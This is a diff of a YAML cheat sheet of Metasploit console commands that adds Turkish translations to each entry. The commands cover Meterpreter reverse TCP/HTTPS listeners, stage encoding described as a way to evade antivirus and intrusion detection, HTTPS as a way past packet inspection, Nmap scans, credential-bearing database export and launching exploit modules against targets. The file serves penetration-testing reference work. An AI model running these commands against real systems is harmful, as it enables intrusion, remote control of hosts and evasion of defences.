@@ -3,96 +3,187 @@ tags: [pentest, exploitation, network, security, enumeration, framework, post-ex
 
 actions:
   # === CORE OPERATIONS ===
-  - title: msfconsole - launch quiet
-    desc: |
-      Start the Metasploit console without displaying the large ASCII art banner. 
-      This is useful for keeping the terminal clean or when piping output to other tools. 
-      It speeds up the startup process slightly and is preferred in automated environments.
+  - title:
+      en: msfconsole - launch quiet
+      tr: msfconsole - sessiz başlatma
+    desc:
+      en: |
+        Start the Metasploit console without displaying the large ASCII art banner. 
+        This is useful for keeping the terminal clean or when piping output to other tools. 
+        It speeds up the startup process slightly and is preferred in automated environments.
+      tr: |
+        Metasploit konsolunu büyük ASCII art açılış yazısını göstermeden başlatın.
+        Terminali temiz tutmak veya çıktıyı diğer araçlara aktarırken kullanışlıdır.
+        Başlatma sürecini biraz hızlandırır ve otomatik ortamlarda tercih edilir.
     command: "msfconsole -q"
 
-  - title: msfconsole - execute specific command
-    desc: |
-      Run a specific set of Metasploit commands directly from the system shell and then remain in the console. 
-      This is highly effective for automating the initial setup of a module or handler. 
-      You can chain multiple commands by separating them with semicolons within the quotes.
+  - title:
+      en: msfconsole - execute specific command
+      tr: msfconsole - belirli komut çalıştırma
+    desc:
+      en: |
+        Run a specific set of Metasploit commands directly from the system shell and then remain in the console. 
+        This is highly effective for automating the initial setup of a module or handler. 
+        You can chain multiple commands by separating them with semicolons within the quotes.
+      tr: |
+        Sistem kabuğundan doğrudan belirli bir Metasploit komut kümesi çalıştırın ve ardından konsolda kalın.
+        Bir modül veya dinleyicinin ilk kurulumunu otomatikleştirmek için oldukça etkilidir.
+        Tırnak içinde noktalı virgüllerle ayırarak birden fazla komutu zincirleyebilirsiniz.
     command: "msfconsole -x \"{{command|help}}\""
 
-  - title: msfconsole - run resource file
-    desc: |
-      Execute a series of Metasploit commands stored in an external file (resource script). 
-      Resource files (.rc) are essential for consistent environment setup, such as configuring database connections or complex listeners. 
-      Using scripts helps avoid manual entry errors during critical phases of a penetration test.
+  - title:
+      en: msfconsole - run resource file
+      tr: msfconsole - kaynak dosyası çalıştırma
+    desc:
+      en: |
+        Execute a series of Metasploit commands stored in an external file (resource script). 
+        Resource files (.rc) are essential for consistent environment setup, such as configuring database connections or complex listeners. 
+        Using scripts helps avoid manual entry errors during critical phases of a penetration test.
+      tr: |
+        Harici bir dosyada (kaynak betiği) saklanan bir dizi Metasploit komutu çalıştırın.
+        Kaynak dosyaları (.rc), veritabanı bağlantıları veya karmaşık dinleyiciler yapılandırmak gibi tutarlı ortam kurulumu için gereklidir.
+        Betik kullanmak sızma testinin kritik aşamalarında manuel giriş hatalarından kaçınmaya yardımcı olur.
     command: "msfconsole -r {{resource_file|setup.rc}}"
 
-  - title: msfconsole - search for modules
-    desc: |
-      Search the Metasploit database for specific exploits, payloads, or auxiliary modules based on a keyword. 
-      The results can be filtered by platform, rank, or CVE ID to quickly find the most relevant exploit for a target. 
-      This command is the primary method for discovering capabilities within the framework.
+  - title:
+      en: msfconsole - search for modules
+      tr: msfconsole - modül arama
+    desc:
+      en: |
+        Search the Metasploit database for specific exploits, payloads, or auxiliary modules based on a keyword. 
+        The results can be filtered by platform, rank, or CVE ID to quickly find the most relevant exploit for a target. 
+        This command is the primary method for discovering capabilities within the framework.
+      tr: |
+        Anahtar sözcüğe göre Metasploit veritabanında belirli exploit, yük veya yardımcı modülleri arayın.
+        Sonuçlar platforma, dereceye veya CVE kimliğine göre filtrelenerek hedef için en ilgili exploit hızla bulunabilir.
+        Bu komut çatı içindeki yetenekleri keşfetmenin birincil yöntemidir.
     command: "msfconsole -q -x \"search {{keyword}}; exit\""
 
   # === HANDLERS & LISTENERS ===
-  - title: msfconsole - windows reverse tcp handler
-    desc: |
-      Establish a multi-handler listener for a Windows 32-bit staged Meterpreter reverse TCP connection. 
-      This is the standard listener used for most basic Windows exploitations where a stable callback is expected. 
-      Ensure your firewall allows incoming connections on the specified LPORT.
+  - title:
+      en: msfconsole - windows reverse tcp handler
+      tr: msfconsole - windows ters tcp dinleyicisi
+    desc:
+      en: |
+        Establish a multi-handler listener for a Windows 32-bit staged Meterpreter reverse TCP connection. 
+        This is the standard listener used for most basic Windows exploitations where a stable callback is expected. 
+        Ensure your firewall allows incoming connections on the specified LPORT.
+      tr: |
+        Windows 32-bit aşamalı Meterpreter ters TCP bağlantısı için çoklu dinleyici kurun.
+        Kararlı bir geri bağlantının beklendiği çoğu temel Windows sömürüsü için kullanılan standart dinleyicidir.
+        Güvenlik duvarınızın belirtilen LPORT üzerinde gelen bağlantılara izin verdiğinden emin olun.
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {{lhost}}; set LPORT {{lport|4444}}; run\""
 
-  - title: msfconsole - windows reverse https handler
-    desc: |
-      Set up a listener for a Windows 64-bit staged Meterpreter connection over HTTPS. 
-      Using HTTPS is a common technique for bypassing deep packet inspection (DPI) and egress filtering. 
-      The traffic is encrypted, making it look like legitimate web browsing to many network monitoring tools.
+  - title:
+      en: msfconsole - windows reverse https handler
+      tr: msfconsole - windows ters https dinleyicisi
+    desc:
+      en: |
+        Set up a listener for a Windows 64-bit staged Meterpreter connection over HTTPS. 
+        Using HTTPS is a common technique for bypassing deep packet inspection (DPI) and egress filtering. 
+        The traffic is encrypted, making it look like legitimate web browsing to many network monitoring tools.
+      tr: |
+        HTTPS üzerinden Windows 64-bit aşamalı Meterpreter bağlantısı için bir dinleyici kurun.
+        HTTPS kullanmak derin paket inceleme (DPI) ve çıkış filtrelemeyi aşmak için yaygın bir tekniktir.
+        Trafik şifrelidir ve birçok ağ izleme aracına meşru web gezintisi gibi görünür.
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; run\""
 
-  - title: msfconsole - windows reverse https unstaged handler
-    desc: |
-      Configure a listener for an unstaged (standalone) Windows 64-bit reverse HTTPS payload. 
-      Unstaged payloads do not require a second stage download, making them more resilient in unstable network conditions. 
-      Note that the resulting executable file will be significantly larger than a staged version.
+  - title:
+      en: msfconsole - windows reverse https unstaged handler
+      tr: msfconsole - windows aşamasız ters https dinleyicisi
+    desc:
+      en: |
+        Configure a listener for an unstaged (standalone) Windows 64-bit reverse HTTPS payload. 
+        Unstaged payloads do not require a second stage download, making them more resilient in unstable network conditions. 
+        Note that the resulting executable file will be significantly larger than a staged version.
+      tr: |
+        Aşamasız (tek parça) Windows 64-bit ters HTTPS yükü için bir dinleyici yapılandırın.
+        Aşamasız yükler ikinci aşama indirme gerektirmez ve kararsız ağ koşullarında daha dayanıklıdır.
+        Ortaya çıkan çalıştırılabilir dosyanın aşamalı sürümden önemli ölçüde büyük olacağını unutmayın.
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; run\""
 
-  - title: msfconsole - encoded stage handler
-    desc: |
-      Launch a listener that applies encoding to the payload stage before sending it to the target. 
-      This technique is used to evade signature-based antivirus or network intrusion detection systems that scan the second stage transfer. 
-      The x64/xor_dynamic encoder is a popular choice for modern 64-bit Windows targets.
+  - title:
+      en: msfconsole - encoded stage handler
+      tr: msfconsole - kodlanmış aşama dinleyicisi
+    desc:
+      en: |
+        Launch a listener that applies encoding to the payload stage before sending it to the target. 
+        This technique is used to evade signature-based antivirus or network intrusion detection systems that scan the second stage transfer. 
+        The x64/xor_dynamic encoder is a popular choice for modern 64-bit Windows targets.
+      tr: |
+        Yük aşamasını hedefe göndermeden önce kodlama uygulayan bir dinleyici başlatın.
+        Bu teknik ikinci aşama aktarımını tarayan imza tabanlı antivirüs veya ağ saldırı tespit sistemlerinden kaçmak için kullanılır.
+        x64/xor_dynamic kodlayıcı modern 64-bit Windows hedefleri için popüler bir seçimdir.
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; set EnableStageEncoding true; set StageEncoder {{encoder|x64/xor_dynamic}}; run\""
 
   # === DATABASE & RECONNAISSANCE ===
-  - title: msfconsole - database nmap scan
-    desc: |
-      Execute an Nmap scan from within Metasploit and automatically save the results into the internal database. 
-      This allows you to track discovered hosts, open ports, and services within a unified workspace. 
-      A running PostgreSQL database is required for the information to be stored permanently.
+  - title:
+      en: msfconsole - database nmap scan
+      tr: msfconsole - veritabanlı nmap taraması
+    desc:
+      en: |
+        Execute an Nmap scan from within Metasploit and automatically save the results into the internal database. 
+        This allows you to track discovered hosts, open ports, and services within a unified workspace. 
+        A running PostgreSQL database is required for the information to be stored permanently.
+      tr: |
+        Metasploit içinden bir Nmap taraması çalıştırın ve sonuçları otomatik olarak dahili veritabanına kaydedin.
+        Keşfedilen makineleri, açık portları ve hizmetleri birleşik bir çalışma alanında izlemenizi sağlar.
+        Bilgilerin kalıcı saklanması için çalışan bir PostgreSQL veritabanı gerekir.
     command: "msfconsole -q -x \"db_nmap {{nmap_flags|-sV}} {{target}}; exit\""
 
-  - title: msfconsole - export database
-    desc: |
-      Export all data from the current workspace, including hosts, services, and discovered credentials, to an XML file. 
-      This is a vital step for documentation, reporting, or moving data between different Metasploit installations. 
-      The exported file can be re-imported later using the db_import command.
+  - title:
+      en: msfconsole - export database
+      tr: msfconsole - veritabanını dışa aktarma
+    desc:
+      en: |
+        Export all data from the current workspace, including hosts, services, and discovered credentials, to an XML file. 
+        This is a vital step for documentation, reporting, or moving data between different Metasploit installations. 
+        The exported file can be re-imported later using the db_import command.
+      tr: |
+        Geçerli çalışma alanındaki makineler, hizmetler ve keşfedilen kimlik bilgileri dahil tüm veriyi bir XML dosyasına aktarın.
+        Bu, belgeleme, raporlama veya farklı Metasploit kurulumları arasında veri taşıma için hayati bir adımdır.
+        Dışa aktarılan dosya daha sonra db_import komutuyla yeniden içe aktarılabilir.
     command: "msfconsole -q -x \"db_export -f xml {{output_path|results.xml}}; exit\""
 
-  - title: msfconsole - manage workspaces
-    desc: |
-      List all existing workspaces within the Metasploit database or create a new one. 
-      Workspaces allow you to segregate data for different projects or networks, preventing target confusion. 
-      It is best practice to create a unique workspace for every new engagement.
+  - title:
+      en: msfconsole - manage workspaces
+      tr: msfconsole - çalışma alanlarını yönetme
+    desc:
+      en: |
+        List all existing workspaces within the Metasploit database or create a new one. 
+        Workspaces allow you to segregate data for different projects or networks, preventing target confusion. 
+        It is best practice to create a unique workspace for every new engagement.
+      tr: |
+        Metasploit veritabanındaki tüm mevcut çalışma alanlarını listeleyin veya yeni bir tane oluşturun.
+        Çalışma alanları farklı projeler veya ağlar için veriyi ayırmanızı sağlayarak hedef karışıklığını önler.
+        Her yeni çalışma için benzersiz bir çalışma alanı oluşturmak en iyi uygulamadır.
     command: "msfconsole -q -x \"workspace -a {{workspace_name|project_alpha}}; workspace; exit\""
 
   # === EXPLOITATION EXAMPLES ===
-  - title: msfconsole - run auxiliary scanner
-    desc: |
-      Execute an auxiliary module to perform tasks like port scanning, service identification, or brute-forcing. 
-      Auxiliary modules are used for information gathering and do not typically provide a shell. 
-      This example shows how to run a generic scanner against a specific target range.
+  - title:
+      en: msfconsole - run auxiliary scanner
+      tr: msfconsole - yardımcı tarayıcı çalıştırma
+    desc:
+      en: |
+        Execute an auxiliary module to perform tasks like port scanning, service identification, or brute-forcing. 
+        Auxiliary modules are used for information gathering and do not typically provide a shell. 
+        This example shows how to run a generic scanner against a specific target range.
+      tr: |
+        Port tarama, hizmet belirleme veya kaba kuvvet gibi görevler için bir yardımcı modül çalıştırın.
+        Yardımcı modüller bilgi toplama için kullanılır ve genellikle bir kabuk sağlamaz.
+        Bu örnek belirli bir hedef aralığa karşı genel bir tarayıcının nasıl çalıştırılacağını gösterir.
     command: "msfconsole -q -x \"use {{module|auxiliary/scanner/portscan/tcp}}; set RHOSTS {{target}}; run; exit\""
 
-  - title: msfconsole - execute exploit with auto-target
-    desc: |
-      Quickly launch a specific exploit module against a target while letting Metasploit attempt to determine the target OS/version automatically. 
-      This command uses the 'run' command with pre-set variables for target and host settings. 
-      Always verify the module options with the 'options' command before executing in a production environment.
+  - title:
+      en: msfconsole - execute exploit with auto-target
+      tr: msfconsole - otomatik hedefli exploit çalıştırma
+    desc:
+      en: |
+        Quickly launch a specific exploit module against a target while letting Metasploit attempt to determine the target OS/version automatically. 
+        This command uses the 'run' command with pre-set variables for target and host settings. 
+        Always verify the module options with the 'options' command before executing in a production environment.
+      tr: |
+        Metasploit'in hedef işletim sistemini/sürümünü otomatik belirlemesine izin verirken hedefe karşı belirli bir exploit modülünü hızlıca başlatın.
+        Bu komut hedef ve makine ayarları için önceden ayarlanmış değişkenlerle 'run' komutunu kullanır.
+        Üretim ortamında çalıştırmadan önce modül seçeneklerini 'options' komutuyla mutlaka doğrulayın.
     command: "msfconsole -q -x \"use {{exploit_path}}; set RHOSTS {{target}}; set LHOST {{lhost}}; run\""
